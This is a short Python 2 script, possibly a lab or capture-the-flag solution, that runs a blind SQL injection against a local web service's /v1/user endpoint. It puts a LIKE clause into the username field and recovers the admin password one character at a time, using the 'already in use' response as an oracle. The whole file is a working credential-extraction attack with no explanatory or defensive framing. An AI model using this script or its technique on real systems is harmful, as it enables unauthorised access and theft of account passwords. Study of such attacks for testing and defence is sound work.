import httplib
import urllib
import json

def sql_injection():
    username = "admin\" AND password LIKE \""
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
    password = ""
    while True:
        end = True
        for char in chars:
            try_password = password + char
            body = {
                "username": username + try_password + "%",
                "password": "abc"
            }
            params = json.dumps(body)
            headers = {"Content-type":"application/json"}
            conn = httplib.HTTPConnection("localhost:8080")
            conn.request("POST", "/v1/user", params, headers)
            res = conn.getresponse()
            if res.read().find("already in use") != -1:
                password = try_password
                print password
                conn.close()
                end = False
                break
            conn.close()
        if end:
            print
            print "Found password"
            print password
            break

if __name__ == "__main__":
    sql_injection()
